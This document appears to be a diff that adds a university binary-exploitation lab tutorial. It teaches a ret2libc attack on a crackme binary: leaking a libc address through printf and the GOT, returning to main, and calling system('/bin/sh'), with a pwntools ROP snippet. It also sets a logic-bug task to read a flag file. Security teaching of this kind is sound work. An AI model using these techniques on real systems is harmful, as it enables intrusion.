@@ -1,0 +1,170 @@
+# Tut08: Make Reliable Exploit
+
+In this tutorial, we are going to learn 1) how to write more reliable 
+exploit and 2) logical vulnerability. 
+
+## 1. Write reliable exploit
+
+Let's start this tutorial by using our old friend - crackme0x00.
+You can generate target binary by:
+
+```
+$ cd crackme
+$ make
+```
+
+### 1.1. Leaking address
+
+As you know, this binary contains simple buffer overflow vulnerability. 
+However, your server has ASLR setting enabled and this will change 
+your LIBC address everytime you run the binary. 
+
+How about your compile environment? If you compile the binary in 
+different environment (e.g., different compiler), the binary will be
+changed; then your exploit may no longer work. 
+
+Our goal is to write more reliable exploit that doesn't depend on
+static offset and doesn't require brute-forcing. To achieve that, 
+you should successfully leak the LIBC address first. 
+
+Take a look at the disassembled code from `start()` function:
+
+```
+...
+0x08048576 <+25>:  call   0x8048400 <printf@plt>
+0x0804857b <+30>:  mov    DWORD PTR [esp+0x8],0x20
+0x08048583 <+38>:  mov    DWORD PTR [esp+0x4],0x0
+0x0804858b <+46>:  lea    eax,[ebp-0x28]
+0x0804858e <+49>:  mov    DWORD PTR [esp],eax
+...
+```
+
+How about overwriting buffer and invoke `printf()` function 
+and argument with `__libc_start_main()`'s got address'? 
+After you leak the address, you will get the LIBC base address. 
+Sounds like a plan? Your payload will be like this:
+
+```
+[Overwrite Buf] [printf] [ret] [__libc_start_main]
+```
+
+Once you invoke `printf()` function and leak the address of 
+`__libc_start_main`, you will go back to ret address that you specified.
+
+
+Take your time and make your exploit. We recommend you to use 
+template.py script. 
+
+Could you successfully leak the address of `__libc_start_main()`?
+If you are running the tutorial in the CS6265 remote server, 
+you probably not see anything. Ok! Let's find out the reason.
+
+```
+$ ldd crackme0x00
+      linux-gate.so.1 =>  (0xf775d000)
+      libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf759b000)
+      /lib/ld-linux.so.2 (0x5656d000)
+
+$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep __libc_start_main
+  2262: 00019a00   454 FUNC    GLOBAL DEFAULT   12 __libc_start_main@@GLIBC_2.0
+```
+
+Do you see anything interesting? `0x19a00` is an offset value of the 
+`__libc_start_main()` function in LIBC library and this address ends 
+with `\00`. If the address is used for an argument of the `printf()` function, 
+the function will not print value after the `\x00` so you are not able
+to leak the address. 
+
+Instead of using `__libc_start_main()` for leaking, you can use 
+`setvbuf()`'s address or other functions if the address is not ended with `\00`.
+
+```
+$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep setvbuf
+  2008: 00065ec0   405 FUNC    WEAK   DEFAULT   12 setvbuf@@GLIBC_2.0
+```
+
+### 1.2. Prevent from using fixed address
+
+Now you should make your first exploit looks like this:
+
+```
+[Overwrite Buf] [printf] [ret] [setvbuf]
+```
+
+It means that you should know the address of each functions (e.g., printf)
+by reading symbol table or by doing debugging. Fortunately, pwntools 
+provides very useful functions to handle this issue.
+
+Open and take a look at the examples from template.py script. 
+You can search symbols, got, or string's address by using pwntools. 
+
+- `printf       = elf.symbols['printf']`
+- `leak_add     = elf.got['setvbuf']`
+- `binsh_offset = libc.search('/bin/sh').next()`
+
+
+I think it is good time to make the first half of exploit for 
+leaking the address. You should be able to print out address of `setvbuf()`.
+
+
+### 1.3. Going back to the `main()` again
+
+Recall the first payload:
+
+```
+[Overwrite Buf] [printf] [ret] [setvbuf]
+```
+
+Where do you want to go back after you leak the address of `setvbuf()`?
+One good choice would be going back to the `main()` function. After you go 
+back to `main()`, you are able to overflow the buffer and feed your exploit. 
+
+To do so, your first and second payload should be:
+
+```
+1st: [Overwrite Buf] [printf] [ret] [setvbuf]
+2nd: [Overwrite Buf] [system] [exit] [bin_sh]
+```
+
+### * pwntools ROP support
+
+You can also automate the ROP programming process. Take a look at the 
+below sample, then you will have a good idea about how to utilize this.
+
+```python
+from pwn import *
+
+libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+libc.address = LEAKED_LIBC_BASE_ADDRESS
+
+rop = ROP(libc)
+rop.system(next(libc.search('/bin/sh\x00')))
+payload = "A" * 44 + str(rop)
+```
+
+If you are ambitious, you can fully automate the entire exploit process 
+by using referenced symbols and ROP functionality.
+
+## 2. Logical errors
+
+You can play a game and enjoy pwning here. Compile the binary first.
+
+```
+$ cd snake
+$ make
+```
+
+Interestingly, the binary invokes `system()` function when it starts. 
+If you have a good idea, you can spwan a shell or read the flag 
+without exploiting the memory corruption bugs that you learned so far.
+
+```c
+$ cat snake.c|grep system
+
+  exit (WEXITSTATUS(system ("stty sane")));
+  if (WEXITSTATUS(system ("stty cbreak -echo stop u")))
+  return WEXITSTATUS(system ("stty sane"));
+```
+
+> **[Task]** In the second section of this tutorial, your mission is to make the 
+> snake binary do unintended behavior. (e.g., `cat /proc/flag`) 
